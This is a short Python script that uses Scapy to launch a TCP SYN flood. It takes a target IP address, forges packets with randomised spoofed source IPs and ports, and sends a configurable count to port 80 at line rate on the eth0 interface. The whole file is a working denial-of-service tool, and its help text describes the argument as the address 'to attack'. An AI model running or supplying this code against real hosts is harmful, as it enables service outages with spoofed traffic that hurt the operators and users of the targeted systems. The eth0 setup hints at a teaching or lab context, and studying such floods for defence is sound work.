import argparse
import sys
import socket
import random
import struct
import time

from scapy.all import sendp, send, get_if_list, get_if_hwaddr
from scapy.all import Packet
from scapy.all import Ether, IP, UDP, TCP

def get_if():
    ifs=get_if_list()
    iface=None
    for i in get_if_list():
        if "eth0" in i:
            iface=i
            break;
    if not iface:
        print("Cannot find eth0 interface")
        exit(1)
    return iface

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_addr', type=str, help="The destination IP address to attack")
    parser.add_argument('--count', type=int, default=1000, help="Number of packets to send in the flood")
    args = parser.parse_args()

    addr = socket.gethostbyname(args.ip_addr)
    iface = get_if()

    print("Starting SYN flood on interface %s targeting %s" % (iface, str(addr)))
    print("Sending %d packets rapidly..." % args.count)
    
    packets = []
    mac_src = get_if_hwaddr(iface)

    for i in range(args.count):
        # Generate random source IPs for the flood
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        
        pkt = Ether(src=mac_src, dst='ff:ff:ff:ff:ff:ff') / \
              IP(src=src_ip, dst=addr) / \
              TCP(dport=80, sport=src_port, flags='S')
        
        packets.append(pkt)

    start_time = time.time()
    # Send packets at line rate (as fast as Scapy can)
    sendp(packets, iface=iface, verbose=False)
    
    duration = time.time() - start_time
    print("Sent %d SYN packets in %.2f seconds (%.2f packets/sec)" % (args.count, duration, args.count/duration))

if __name__ == '__main__':
    main()
